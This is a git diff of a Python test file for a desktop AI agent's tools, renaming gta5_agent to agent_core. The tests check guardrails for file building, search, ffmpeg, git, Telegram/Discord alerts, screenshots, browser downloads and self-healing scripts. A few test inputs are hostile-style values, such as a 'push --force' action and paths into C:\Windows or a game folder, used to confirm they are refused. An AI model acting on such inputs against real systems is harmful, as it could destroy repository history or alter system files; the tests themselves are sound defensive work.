         self.assertEqual(spoken, ["The 3D model is ready."])
 
     def test_blender_launch_passes_the_script_and_output(self) -> None:
         mesh = "o Basket\nv 0 0 0\nv 1 0 0\nv 0 1 0\nf 1 2 3\n"
         output = self.root / "workspace" / "launch-basket.obj"
-        gta5_agent.blender_runner_override = None
-        gta5_agent.blender_executable_override = self.root / "blender.exe"
-        gta5_agent.blender_notify_override = lambda message: None
+        agent_core.blender_runner_override = None
+        agent_core.blender_executable_override = self.root / "blender.exe"
+        agent_core.blender_notify_override = lambda message: None
         calls: list[list[str]] = []
 
         class Process:
@@ -2558,7 +2558,7 @@ class AgentToolTests(unittest.TestCase):
             return Process()
 
         with mock.patch("blender_task.subprocess.Popen", side_effect=popen):
-            built = gta5_agent.invoke_tool(
+            built = agent_core.invoke_tool(
                 "run_blender_task",
                 {
                     "script": "import bpy\nbpy.ops.mesh.primitive_cube_add()\n",
@@ -2575,7 +2575,7 @@ class AgentToolTests(unittest.TestCase):
             raise OSError("The system cannot find blender.exe")
 
         with mock.patch("blender_task.subprocess.Popen", side_effect=missing_program):
-            failed = gta5_agent.invoke_tool(
+            failed = agent_core.invoke_tool(
                 "run_blender_task",
                 {
                     "script": "import bpy\nbpy.ops.mesh.primitive_cube_add()\n",
@@ -2588,11 +2588,11 @@ class AgentToolTests(unittest.TestCase):
         self.assertNotIn("positional argument", failed["error"])
 
     def test_local_program_writes_files_and_does_not_launch_unless_asked(self) -> None:
-        self.assertIn("build_local_program", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("original program", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("Adobe After Effects", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("build_local_program", agent_core.SYSTEM_PROMPT)
+        self.assertIn("original program", agent_core.SYSTEM_PROMPT)
+        self.assertIn("Adobe After Effects", agent_core.SYSTEM_PROMPT)
 
-        gta5_agent.begin_task_turn("build me a cheap video editor")
+        agent_core.begin_task_turn("build me a cheap video editor")
         files = json.dumps(
             [
                 {
@@ -2602,7 +2602,7 @@ class AgentToolTests(unittest.TestCase):
                 {"path": "notes.txt", "content": "A small original layer editor.\n"},
             ]
         )
-        saved = gta5_agent.invoke_tool(
+        saved = agent_core.invoke_tool(
             "build_local_program",
             {"name": "test-editor", "files": files, "run": False},
         )
@@ -2611,23 +2611,23 @@ class AgentToolTests(unittest.TestCase):
         project = Path(saved["path"])
         self.assertEqual(
             project,
-            (gta5_agent.WORKSPACE / "builds" / "test-editor").resolve(),
+            (agent_core.WORKSPACE / "builds" / "test-editor").resolve(),
         )
         self.assertIn("Test editor", (project / "main.py").read_text(encoding="utf-8"))
         self.assertTrue((project / "notes.txt").is_file())
 
-        gta5_agent.begin_task_turn(
+        agent_core.begin_task_turn(
             "build me a cheap video editor and organize my GameDrive drive"
         )
-        blocked = gta5_agent.invoke_tool(
+        blocked = agent_core.invoke_tool(
             "build_local_program",
             {"name": "test-editor", "files": files},
         )
         self.assertFalse(blocked["ok"])
         self.assertIn("create_task_plan", blocked["error"])
 
-        gta5_agent.begin_task_turn("")
-        outside = gta5_agent.invoke_tool(
+        agent_core.begin_task_turn("")
+        outside = agent_core.invoke_tool(
             "build_local_program",
             {
                 "name": "escape",
@@ -2638,7 +2638,7 @@ class AgentToolTests(unittest.TestCase):
         )
         self.assertFalse(outside["ok"])
         self.assertIn("inside the project", outside["error"])
-        windows = gta5_agent.invoke_tool(
+        windows = agent_core.invoke_tool(
             "build_local_program",
             {
                 "name": "bad",
@@ -2647,7 +2647,7 @@ class AgentToolTests(unittest.TestCase):
             },
         )
         self.assertFalse(windows["ok"])
-        cracked = gta5_agent.invoke_tool(
+        cracked = agent_core.invoke_tool(
             "build_local_program",
             {
                 "name": "bad",
@@ -2660,7 +2660,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("original program", cracked["error"])
 
         game = self.make_game()
-        in_game = gta5_agent.invoke_tool(
+        in_game = agent_core.invoke_tool(
             "build_local_program",
             {"name": "mod", "output_path": str(game), "files": files},
         )
@@ -2668,7 +2668,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("game folder", in_game["error"])
 
         with self.assertRaises(AssertionError) as caught:
-            gta5_agent.local_build.build_local_program(
+            agent_core.local_build.build_local_program(
                 "test-editor",
                 files,
                 entry="main.py",
@@ -2678,7 +2678,7 @@ class AgentToolTests(unittest.TestCase):
 
         drive = self.root / "pedrodrive"
         drive.mkdir()
-        gta5_agent._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
+        agent_core._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
         launched: list[list[str]] = []
 
         def runner(command: list[str], cwd: Path) -> None:
@@ -2687,8 +2687,8 @@ class AgentToolTests(unittest.TestCase):
             self.assertEqual(cwd, (drive / "Apps" / "editor").resolve())
             launched.append(command)
 
-        gta5_agent.program_runner_override = runner
-        started = gta5_agent.invoke_tool(
+        agent_core.program_runner_override = runner
+        started = agent_core.invoke_tool(
             "build_local_program",
             {
                 "name": "editor",
@@ -2706,14 +2706,14 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("Test editor", (drive / "Apps" / "editor" / "main.py").read_text(encoding="utf-8"))
 
     def test_time_search_keeps_last_week_videos(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
         for name in (
             "send_remote_update",
             "process_media",
             "git_manager",
             "search_files_by_time",
         ):
-            self.assertIn(name, gta5_agent.TOOLS)
+            self.assertIn(name, agent_core.TOOLS)
             self.assertIn(name, names)
         for phrase in (
             "search_files_by_time",
@@ -2722,15 +2722,15 @@ class AgentToolTests(unittest.TestCase):
             "git_manager",
             "Never force-push",
         ):
-            self.assertIn(phrase, gta5_agent.SYSTEM_PROMPT)
-        self.assertFalse(gta5_agent._request_needs_plan("Open Excel"))
-        self.assertFalse(gta5_agent._request_needs_plan("videos from last week"))
-        self.assertFalse(gta5_agent._request_needs_plan("convert this video"))
+            self.assertIn(phrase, agent_core.SYSTEM_PROMPT)
+        self.assertFalse(agent_core._request_needs_plan("Open Excel"))
+        self.assertFalse(agent_core._request_needs_plan("videos from last week"))
+        self.assertFalse(agent_core._request_needs_plan("convert this video"))
         self.assertTrue(
-            gta5_agent._request_needs_plan("text me on telegram and transcode the video")
+            agent_core._request_needs_plan("text me on telegram and transcode the video")
         )
 
-        root = gta5_agent.search_root_override
+        root = agent_core.search_root_override
         assert root is not None
         clips = root / "clips"
         clips.mkdir()
@@ -2754,7 +2754,7 @@ class AgentToolTests(unittest.TestCase):
         elsewhere.mkdir()
         (elsewhere / "lost.mp4").write_bytes(b"lost")
         frozen = datetime(2026, 3, 15, 15, 0, 0).timestamp()
-        gta5_agent.scheduler_clock = lambda: frozen
+        agent_core.scheduler_clock = lambda: frozen
         os.utime(newer, (datetime(2026, 3, 6, 12).timestamp(),) * 2)
         os.utime(older, (datetime(2026, 3, 4, 12).timestamp(),) * 2)
         os.utime(outside, (datetime(2026, 3, 12, 12).timestamp(),) * 2)
@@ -2763,7 +2763,7 @@ class AgentToolTests(unittest.TestCase):
         os.utime(secret, (datetime(2026, 3, 6, 12).timestamp(),) * 2)
         os.utime(elsewhere / "lost.mp4", (datetime(2026, 3, 6, 12).timestamp(),) * 2)
 
-        found = gta5_agent.invoke_tool(
+        found = agent_core.invoke_tool(
             "search_files_by_time",
             {"query": "videos from last week"},
         )
@@ -2779,10 +2779,10 @@ class AgentToolTests(unittest.TestCase):
         self.assertNotIn(".env", blob)
         self.assertTrue(newer.is_file())
 
-        month = gta5_agent.local_search.search_files_by_time("videos from last month")
+        month = agent_core.local_search.search_files_by_time("videos from last month")
         self.assertTrue(month["ok"], month)
         self.assertEqual([item["name"] for item in month["matches"]], ["february.mp4"])
-        bare = gta5_agent.local_search.search_files_by_time("hello")
+        bare = agent_core.local_search.search_files_by_time("hello")
         self.assertFalse(bare["ok"])
         self.assertIn("file type or a time", bare["error"])
 
@@ -2810,16 +2810,16 @@ class AgentToolTests(unittest.TestCase):
             stamp = moment.timestamp()
             os.utime(path, (stamp, stamp))
         self.assertFalse(
-            gta5_agent._request_needs_plan("Where is the Excel file I saved yesterday?")
+            agent_core._request_needs_plan("Where is the Excel file I saved yesterday?")
         )
-        gta5_agent.search_root_override = None
-        gta5_agent.scheduler_clock = lambda: datetime(2026, 10, 11, 15).timestamp()
-        gta5_agent._volumes = lambda: [(str(pedro) + "\\", "GameDrive")]
-        original_app = gta5_agent.APP_DIR
-        gta5_agent.APP_DIR = project
+        agent_core.search_root_override = None
+        agent_core.scheduler_clock = lambda: datetime(2026, 10, 11, 15).timestamp()
+        agent_core._volumes = lambda: [(str(pedro) + "\\", "GameDrive")]
+        original_app = agent_core.APP_DIR
+        agent_core.APP_DIR = project
         try:
             with mock.patch("local_search.Path.home", return_value=home):
-                found = gta5_agent.local_search.search_files_by_time(
+                found = agent_core.local_search.search_files_by_time(
                     "Where is the Excel file I saved yesterday?"
                 )
                 self.assertTrue(found["ok"], found)
@@ -2831,52 +2831,52 @@ class AgentToolTests(unittest.TestCase):
                 self.assertNotIn("notes.txt", blob)
                 self.assertNotIn("project.xlsx", blob)
 
-                pedro_only = gta5_agent.local_search.search_files_by_time(
+                pedro_only = agent_core.local_search.search_files_by_time(
                     "Excel file I saved yesterday on GameDrive"
                 )
                 self.assertEqual(
                     [item["name"] for item in pedro_only["matches"]],
                     ["pedro.xlsx"],
                 )
-                desk = gta5_agent.local_search.search_files_by_time(
+                desk = agent_core.local_search.search_files_by_time(
                     "Excel file on the desktop from yesterday"
                 )
                 self.assertEqual(
                     [item["name"] for item in desk["matches"]],
                     ["budget.xlsx"],
                 )
-                owned = gta5_agent.local_search.search_files_by_time(
+                owned = agent_core.local_search.search_files_by_time(
                     "Excel file in my project folder from yesterday"
                 )
                 self.assertEqual(
                     [item["name"] for item in owned["matches"]],
                     ["project.xlsx"],
                 )
-                blocked = gta5_agent.local_search.search_files_by_time(
+                blocked = agent_core.local_search.search_files_by_time(
                     r"Excel file saved yesterday in C:\Windows"
                 )
                 self.assertFalse(blocked["ok"])
                 self.assertIn("outside the folders", blocked["error"])
         finally:
-            gta5_agent.APP_DIR = original_app
-            gta5_agent.search_root_override = self.root / "pedro"
+            agent_core.APP_DIR = original_app
+            agent_core.search_root_override = self.root / "pedro"
 
     def test_ffmpeg_converts_without_a_shell(self) -> None:
-        self.assertIn("shell=False", inspect.getsource(gta5_agent.media_ffmpeg._run))
+        self.assertIn("shell=False", inspect.getsource(agent_core.media_ffmpeg._run))
         clip = self.root / "clips" / "a.mp4"
         clip.parent.mkdir()
         clip.write_bytes(b"source-video")
         with self.assertRaises(AssertionError) as guarded:
-            gta5_agent.media_ffmpeg.process_media("convert", str(clip), str(self.root / "out.mp4"))
+            agent_core.media_ffmpeg.process_media("convert", str(clip), str(self.root / "out.mp4"))
         self.assertIn("real ffmpeg", str(guarded.exception))
 
-        gta5_agent.ffmpeg_executable_override = False
-        gta5_agent.media_runner_override = None
+        agent_core.ffmpeg_executable_override = False
+        agent_core.media_runner_override = None
         with mock.patch(
             "media_ffmpeg.subprocess.run",
             side_effect=AssertionError("real ffmpeg"),
         ):
-            missing = gta5_agent.media_ffmpeg.process_media("convert", str(clip))
+            missing = agent_core.media_ffmpeg.process_media("convert", str(clip))
         self.assertFalse(missing["ok"])
         self.assertIn("not installed", missing["error"])
 
@@ -2899,14 +2899,14 @@ class AgentToolTests(unittest.TestCase):
         source = drive / "clips" / "a.mp4"
         source.parent.mkdir(parents=True)
         source.write_bytes(b"pedro-video")
-        gta5_agent._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
-        gta5_agent.ffmpeg_executable_override = self.root / "ffmpeg-test"
-        gta5_agent.media_runner_override = runner
+        agent_core._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
+        agent_core.ffmpeg_executable_override = self.root / "ffmpeg-test"
+        agent_core.media_runner_override = runner
         with mock.patch(
             "media_ffmpeg.subprocess.run",
             side_effect=AssertionError("real ffmpeg"),
         ):
-            converted = gta5_agent.invoke_tool(
+            converted = agent_core.invoke_tool(
                 "process_media",
                 {
                     "action": "convert",
@@ -2919,7 +2919,7 @@ class AgentToolTests(unittest.TestCase):
         output = drive / "clips" / "a-out.mp4"
         self.assertGreaterEqual(output.stat().st_size, 16)
         self.assertEqual(calls[0][calls[0].index("-i") + 1], str(source.resolve()))
-        blocked = gta5_agent.invoke_tool(
+        blocked = agent_core.invoke_tool(
             "process_media",
             {"action": "convert", "source": r"C:\Windows\clip.mp4"},
         )
@@ -2931,7 +2931,7 @@ class AgentToolTests(unittest.TestCase):
         for index in range(9):
             (folder / f"a{index}.mp4").write_bytes(b"clip")
         calls.clear()
-        batched = gta5_agent.media_ffmpeg.process_media(
+        batched = agent_core.media_ffmpeg.process_media(
             "convert",
             str(folder),
             str(self.root / "batch-out"),
@@ -2940,7 +2940,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(len(calls), 8)
         self.assertEqual(len(batched["files"]), 8)
 
-        frames = gta5_agent.media_ffmpeg.process_media(
+        frames = agent_core.media_ffmpeg.process_media(
             "extract_frames",
             str(clip),
             str(self.root / "frames"),
@@ -2949,13 +2949,13 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue((self.root / "frames" / "frame-0001.png").is_file())
 
     def test_git_commit_unstages_secrets_and_push_is_plain(self) -> None:
-        self.assertIn("shell=False", inspect.getsource(gta5_agent.git_manager._run))
+        self.assertIn("shell=False", inspect.getsource(agent_core.git_manager._run))
         repo = self.root / "repo"
         repo.mkdir()
         (repo / "main.py").write_text("print(1)\n", encoding="utf-8")
         (repo / ".env").write_text("TOKEN=1\n", encoding="utf-8")
         with self.assertRaises(AssertionError) as guarded:
-            gta5_agent.git_manager.git_manager("status", str(repo))
+            agent_core.git_manager.git_manager("status", str(repo))
         self.assertIn("real git", str(guarded.exception))
 
         calls: list[list[str]] = []
@@ -2978,9 +2978,9 @@ class AgentToolTests(unittest.TestCase):
                 return {"returncode": 0, "stdout": "", "stderr": ""}
             return {"returncode": 0, "stdout": "", "stderr": ""}
 
-        gta5_agent.git_runner_override = runner
+        agent_core.git_runner_override = runner
         with mock.patch("git_manager.subprocess.run", side_effect=AssertionError("real git")):
-            committed = gta5_agent.invoke_tool(
+            committed = agent_core.invoke_tool(
                 "git_manager",
                 {"action": "commit", "path": str(repo), "message": "Save the editor"},
             )
@@ -2992,14 +2992,14 @@ class AgentToolTests(unittest.TestCase):
         self.assertNotIn(".env", committed["files"])
 
         calls.clear()
-        forced = gta5_agent.invoke_tool(
+        forced = agent_core.invoke_tool(
             "git_manager",
             {"action": "push --force", "path": str(repo)},
         )
         self.assertFalse(forced["ok"])
         self.assertIn("Force push", forced["error"])
         self.assertEqual(calls, [])
-        pushed = gta5_agent.invoke_tool("git_manager", {"action": "push", "path": str(repo)})
+        pushed = agent_core.invoke_tool("git_manager", {"action": "push", "path": str(repo)})
         self.assertTrue(pushed["ok"], pushed)
         self.assertEqual(calls, [["git", "push"]])
 
@@ -3017,22 +3017,22 @@ class AgentToolTests(unittest.TestCase):
                 return {"returncode": 0, "stdout": " M main.py\n", "stderr": ""}
             return {"returncode": 0, "stdout": "", "stderr": ""}
 
-        gta5_agent.git_runner_override = missing_identity
-        unnamed = gta5_agent.git_manager.git_manager("commit", str(repo), "Save the editor")
+        agent_core.git_runner_override = missing_identity
+        unnamed = agent_core.git_manager.git_manager("commit", str(repo), "Save the editor")
         self.assertFalse(unnamed["ok"])
         self.assertIn("will not change git config", unnamed["error"])
         self.assertTrue(all("config" not in command for command in calls))
 
         calls.clear()
-        gta5_agent.git_runner_override = runner
-        cracked = gta5_agent.git_manager.git_manager(
+        agent_core.git_runner_override = runner
+        cracked = agent_core.git_manager.git_manager(
             "commit",
             str(repo),
             "add the fitgirl repack",
         )
         self.assertFalse(cracked["ok"])
         self.assertEqual(calls, [])
-        empty = gta5_agent.git_manager.git_manager("commit", str(repo), " ")
+        empty = agent_core.git_manager.git_manager("commit", str(repo), " ")
         self.assertFalse(empty["ok"])
         self.assertIn("commit message", empty["error"])
 
@@ -3071,12 +3071,12 @@ class AgentToolTests(unittest.TestCase):
                 return {"result": []}
             return {"ok": True}
 
-        gta5_agent.remote_transport_override = transport
-        gta5_agent.remote_reply_override = lambda text: "The export is ready."
+        agent_core.remote_transport_override = transport
+        agent_core.remote_reply_override = lambda text: "The export is ready."
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real network")):
             with mock.patch("builtins.print") as printed:
-                checked = gta5_agent.remote_bridge.poll_once()
-                again = gta5_agent.remote_bridge.poll_once()
+                checked = agent_core.remote_bridge.poll_once()
+                again = agent_core.remote_bridge.poll_once()
         self.assertTrue(checked["ok"], checked)
         self.assertEqual(checked["replied"], 1)
         self.assertEqual(again["replied"], 0)
@@ -3091,8 +3091,8 @@ class AgentToolTests(unittest.TestCase):
         def boom(kind: str, payload: dict[str, object]) -> dict[str, object]:
             raise RuntimeError(f"failed bot{token} and {hook}")
 
-        gta5_agent.remote_transport_override = boom
-        failed = gta5_agent.remote_bridge.poll_once()
+        agent_core.remote_transport_override = boom
+        failed = agent_core.remote_bridge.poll_once()
         self.assertFalse(failed["ok"])
         self.assertNotIn(token, failed["error"])
         self.assertNotIn(hook, failed["error"])
@@ -3107,9 +3107,9 @@ class AgentToolTests(unittest.TestCase):
             sent.append((kind, payload))
             return {"ok": True}
 
-        gta5_agent.remote_transport_override = alerts
+        agent_core.remote_transport_override = alerts
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real network")):
-            note = gta5_agent.remote_bridge.notify("Blender export is done")
+            note = agent_core.remote_bridge.notify("Blender export is done")
         self.assertTrue(note["ok"], note)
         self.assertEqual(note["channels"], ["discord", "telegram"])
         self.assertEqual(sent[0][0], "discord")
@@ -3119,21 +3119,21 @@ class AgentToolTests(unittest.TestCase):
         os.environ.pop("TELEGRAM_BOT_TOKEN", None)
         os.environ.pop("TELEGRAM_CHAT_ID", None)
         sent.clear()
-        discord_only = gta5_agent.remote_bridge.notify("Script finished")
+        discord_only = agent_core.remote_bridge.notify("Script finished")
         self.assertTrue(discord_only["ok"], discord_only)
         self.assertEqual(discord_only["channels"], ["discord"])
         self.assertEqual([item[0] for item in sent], ["discord"])
 
         os.environ.pop("DISCORD_WEBHOOK_URL", None)
-        gta5_agent.remote_transport_override = None
-        quiet = gta5_agent.invoke_tool("send_remote_update", {"message": "hello"})
+        agent_core.remote_transport_override = None
+        quiet = agent_core.invoke_tool("send_remote_update", {"message": "hello"})
         self.assertFalse(quiet["ok"])
         self.assertIn("not set up", quiet["error"])
 
     def test_phone_screenshot_sends_a_photo_without_blocking(self) -> None:
         from PIL import Image
 
-        bridge = gta5_agent.remote_bridge
+        bridge = agent_core.remote_bridge
         self.assertTrue(bridge.wants_screenshot("/screenshot"))
         self.assertTrue(bridge.wants_screenshot("/screenshot@desk_bot"))
         self.assertTrue(bridge.wants_screenshot("send a screenshot"))
@@ -3146,7 +3146,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertFalse(bridge.wants_screenshot("is the export done?"))
         self.assertFalse(bridge.wants_screenshot("show me my documents"))
         self.assertFalse(bridge.wants_screenshot("send a screenshot and organize my drive"))
-        self.assertIn("send a screenshot", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("send a screenshot", agent_core.SYSTEM_PROMPT)
 
         token = "phone-token-value"
         hook = "https://discord.com/api/webhooks/9/phone-hook-value"
@@ -3162,8 +3162,8 @@ class AgentToolTests(unittest.TestCase):
             shots.append("shot")
             return {"png": png, "screen_width": 20, "screen_height": 10}
 
-        gta5_agent.screenshot_override = capture
-        expected = gta5_agent.take_screenshot()["_screenshot_bytes"]
+        agent_core.screenshot_override = capture
+        expected = agent_core.take_screenshot()["_screenshot_bytes"]
         self.assertTrue(expected.startswith(b"\xff\xd8"))
         prepared = bridge._telegram_jpeg(expected)
         self.assertTrue(prepared.startswith(b"\xff\xd8"))
@@ -3180,8 +3180,8 @@ class AgentToolTests(unittest.TestCase):
             seen.append((kind, payload))
             return {"ok": True}
 
-        gta5_agent.remote_transport_override = transport
-        gta5_agent.remote_reply_override = lambda text: "The export is ready."
+        agent_core.remote_transport_override = transport
+        agent_core.remote_reply_override = lambda text: "The export is ready."
 
         def updates(commands: list[tuple[int, int, str]]) -> dict[str, object]:
             return {
@@ -3195,7 +3195,7 @@ class AgentToolTests(unittest.TestCase):
             }
 
         with mock.patch("urllib.request.urlopen", side_effect=AssertionError("real network")):
-            gta5_agent.remote_transport_override = lambda kind, payload: (
+            agent_core.remote_transport_override = lambda kind, payload: (
                 updates([(7, 99, "/screenshot"), (8, 42, "show me my screen")])
                 if kind == "telegram_updates"
                 else transport(kind, payload)
@@ -3209,7 +3209,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(seen[0][1]["chat_id"], "42")
         self.assertEqual(seen[0][1]["image"], expected)
         self.assertEqual(seen[1][1]["image"], expected)
-        self.assertFalse(list((gta5_agent.WORKSPACE / "screenshots").glob("phone-*")))
+        self.assertFalse(list((agent_core.WORKSPACE / "screenshots").glob("phone-*")))
 
         seen.clear()
         shots.clear()
@@ -3218,8 +3218,8 @@ class AgentToolTests(unittest.TestCase):
             shots.append("empty")
             return {"png": b"", "screen_width": 8, "screen_height": 8}
 
-        gta5_agent.screenshot_override = empty
-        gta5_agent.remote_transport_override = lambda kind, payload: (
+        agent_core.screenshot_override = empty
+        agent_core.remote_transport_override = lambda kind, payload: (
             updates([(9, 42, "send a screenshot")])
             if kind == "telegram_updates"
             else transport(kind, payload)
@@ -3229,10 +3229,10 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual([item[0] for item in seen], ["telegram_send"])
         self.assertNotIn("telegram_photo", [item[0] for item in seen])
         self.assertIn("no image", str(seen[0][1]).casefold())
-        self.assertFalse(list((gta5_agent.WORKSPACE / "screenshots").glob("phone-*")))
+        self.assertFalse(list((agent_core.WORKSPACE / "screenshots").glob("phone-*")))
 
-        gta5_agent.screenshot_override = capture
-        gta5_agent.remote_transport_override = None
+        agent_core.screenshot_override = capture
+        agent_core.remote_transport_override = None
         bridge.reset_remote_bridge()
         release = threading.Event()
         entered = threading.Event()
@@ -3307,13 +3307,13 @@ class AgentToolTests(unittest.TestCase):
                 if worker.name == "phone-photo":
                     worker.join(2)
         self.assertGreaterEqual(len(bodies), 1)
-        self.assertFalse(list((gta5_agent.WORKSPACE / "screenshots").glob("phone-*")))
+        self.assertFalse(list((agent_core.WORKSPACE / "screenshots").glob("phone-*")))
 
     def test_phone_screenshot_reports_telegram_rejection(self) -> None:
         import urllib.error
         from PIL import Image
 
-        bridge = gta5_agent.remote_bridge
+        bridge = agent_core.remote_bridge
         token = "phone-token-value"
         os.environ["TELEGRAM_BOT_TOKEN"] = token
         os.environ["TELEGRAM_CHAT_ID"] = "42"
@@ -3323,9 +3323,9 @@ class AgentToolTests(unittest.TestCase):
         def capture() -> dict[str, object]:
             return {"png": buffer.getvalue(), "screen_width": 20, "screen_height": 10}
 
-        gta5_agent.screenshot_override = capture
-        gta5_agent.remote_transport_override = None
-        gta5_agent.remote_reply_override = lambda text: "should not run"
+        agent_core.screenshot_override = capture
+        agent_core.remote_transport_override = None
+        agent_core.remote_reply_override = lambda text: "should not run"
         bridge.reset_remote_bridge()
         entered = threading.Event()
         sent: list[bytes] = []
@@ -3387,14 +3387,14 @@ class AgentToolTests(unittest.TestCase):
                 if worker.name == "phone-photo":
                     worker.join(2)
         self.assertEqual(len(sent), 1)
-        self.assertFalse(list((gta5_agent.WORKSPACE / "screenshots").glob("phone-*")))
+        self.assertFalse(list((agent_core.WORKSPACE / "screenshots").glob("phone-*")))
 
     def test_browser_download_saves_a_report_without_opening_chromium(self) -> None:
         import browser_download
 
         tool = browser_download.browser_download_tool
         downloads = self.root / "Downloads"
-        gta5_agent.downloads_override = downloads
+        agent_core.downloads_override = downloads
         with self.assertRaises(AssertionError):
             tool("https://example.com/reports")
         calls: list[dict[str, object]] = []
@@ -3405,7 +3405,7 @@ class AgentToolTests(unittest.TestCase):
             target.write_bytes(b"item,amount\nhats,12\n")
             return {"title": "Reports", "saved": target}
 
-        gta5_agent.browser_runner_override = runner
+        agent_core.browser_runner_override = runner
         secret = "desk-secret-value"
         os.environ["BROWSER_PASSWORD"] = secret
         self.addCleanup(lambda: os.environ.pop("BROWSER_PASSWORD", None))
@@ -3443,15 +3443,15 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(all(not item["ok"] for item in blocked), blocked)
         self.assertEqual(len(calls), 1)
         self.assertIn("direct file", blocked[2]["error"])
-        self.assertIn("skip a download gate", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("browser_download_tool", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("skip a download gate", agent_core.SYSTEM_PROMPT)
+        self.assertIn("browser_download_tool", agent_core.SYSTEM_PROMPT)
         self.assertFalse(
-            gta5_agent._request_needs_plan(
+            agent_core._request_needs_plan(
                 "Go to this link, log in, and download the latest data report"
             )
         )
         self.assertTrue(
-            gta5_agent._request_needs_plan(
+            agent_core._request_needs_plan(
                 "download the report and update my spreadsheet"
             )
         )
@@ -3461,12 +3461,12 @@ class AgentToolTests(unittest.TestCase):
             target.write_bytes(b"MZ" + b"x" * 20)
             return {"title": "nope", "saved": target}
 
-        gta5_agent.browser_runner_override = plant_exe
+        agent_core.browser_runner_override = plant_exe
         refused = tool("https://example.com/tool", destination="downloads")
         self.assertFalse(refused["ok"], refused)
         self.assertFalse((downloads / "tool.exe").exists())
 
-        gta5_agent._volumes = lambda: [(str(self.root / "pedro") + "\\", "GameDrive")]
+        agent_core._volumes = lambda: [(str(self.root / "pedro") + "\\", "GameDrive")]
         (self.root / "pedro").mkdir(exist_ok=True)
 
         def plant_pedro(plan: dict[str, object], folder: Path) -> dict[str, object]:
@@ -3474,7 +3474,7 @@ class AgentToolTests(unittest.TestCase):
             target.write_bytes(b"item,amount\nhats,12\n")
             return {"title": "Pedro", "saved": target}
 
-        gta5_agent.browser_runner_override = plant_pedro
+        agent_core.browser_runner_override = plant_pedro
         on_drive = tool("https://example.com/reports", destination="GameDrive")
         self.assertTrue(on_drive["ok"], on_drive)
         self.assertEqual(Path(on_drive["path"]).resolve().parent, (self.root / "pedro").resolve())
@@ -3635,7 +3635,7 @@ class AgentToolTests(unittest.TestCase):
             self.assertIn("Finish it in the browser window", str(caught.exception))
             self.assertEqual(page.events, [("goto", "https://example.com/reports")])
 
-            cookie = gta5_agent.WORKSPACE / "session.json"
+            cookie = agent_core.WORKSPACE / "session.json"
             cookie.parent.mkdir(parents=True, exist_ok=True)
             cookie.write_text('{"cookies":[]}', encoding="utf-8")
             page = Page([type("Frame", (), {"url": "about:blank"})()], None)
@@ -3664,14 +3664,14 @@ class AgentToolTests(unittest.TestCase):
             os.environ.pop("BROWSER_PASSWORD", None)
 
     def test_self_heal_fixes_python_and_blender_without_a_live_model(self) -> None:
-        self.assertIn("self_heal_execution", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("git push", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("self_heal_execution", agent_core.SYSTEM_PROMPT)
+        self.assertIn("git push", agent_core.SYSTEM_PROMPT)
         workspace = self.root / "workspace"
         workspace.mkdir(parents=True, exist_ok=True)
         script = workspace / "guard.py"
         script.write_text("print('hi')\n", encoding="utf-8")
         with self.assertRaises(AssertionError) as guarded:
-            gta5_agent.self_heal.self_heal_execution(str(script))
+            agent_core.self_heal.self_heal_execution(str(script))
         self.assertIn("real heal", str(guarded.exception))
 
         calls: list[list[str]] = []
@@ -3690,8 +3690,8 @@ class AgentToolTests(unittest.TestCase):
                 "stderr": "NameError: name 'value' is not defined",
             }
 
-        gta5_agent.heal_runner_override = runner
-        blocked = gta5_agent.invoke_tool(
+        agent_core.heal_runner_override = runner
+        blocked = agent_core.invoke_tool(
             "self_heal_execution",
             {"script_path": r"C:\Windows\heal.py"},
         )
@@ -3701,14 +3701,14 @@ class AgentToolTests(unittest.TestCase):
         game = self.make_game()
         game_script = game / "bad.py"
         game_script.write_text("print(1)\n", encoding="utf-8")
-        inside = gta5_agent.self_heal.self_heal_execution(str(game_script))
+        inside = agent_core.self_heal.self_heal_execution(str(game_script))
         self.assertFalse(inside["ok"])
         self.assertIn("game folder", inside["error"])
         self.assertEqual(calls, [])
 
         cracked = workspace / "cracked.py"
         cracked.write_text("print('fitgirl repack')\n", encoding="utf-8")
-        piracy = gta5_agent.self_heal.self_heal_execution(str(cracked))
+        piracy = agent_core.self_heal.self_heal_execution(str(cracked))
         self.assertFalse(piracy["ok"])
         self.assertIn("crack", piracy["error"].casefold())
         self.assertEqual(calls, [])
@@ -3719,7 +3719,7 @@ class AgentToolTests(unittest.TestCase):
         try:
             leaked = workspace / "leaked.py"
             leaked.write_text(f"print('{secret}')\n", encoding="utf-8")
-            hidden = gta5_agent.self_heal.self_heal_execution(str(leaked))
+            hidden = agent_core.self_heal.self_heal_execution(str(leaked))
             self.assertFalse(hidden["ok"])
             self.assertIn("API key", hidden["error"])
             self.assertEqual(calls, [])
@@ -3731,8 +3731,8 @@ class AgentToolTests(unittest.TestCase):
                 self.assertIn("NameError", error)
                 return "print('fixed')\n"
 
-            gta5_agent.heal_rewriter_override = rewriter
-            fixed = gta5_agent.invoke_tool("self_heal_execution", {"script_path": str(job)})
+            agent_core.heal_rewriter_override = rewriter
+            fixed = agent_core.invoke_tool("self_heal_execution", {"script_path": str(job)})
             self.assertTrue(fixed["ok"], fixed)
             self.assertEqual(fixed["status"], "ready")
             self.assertIn("Fixed and finished on attempt 2", fixed["message"])
@@ -3750,17 +3750,17 @@ class AgentToolTests(unittest.TestCase):
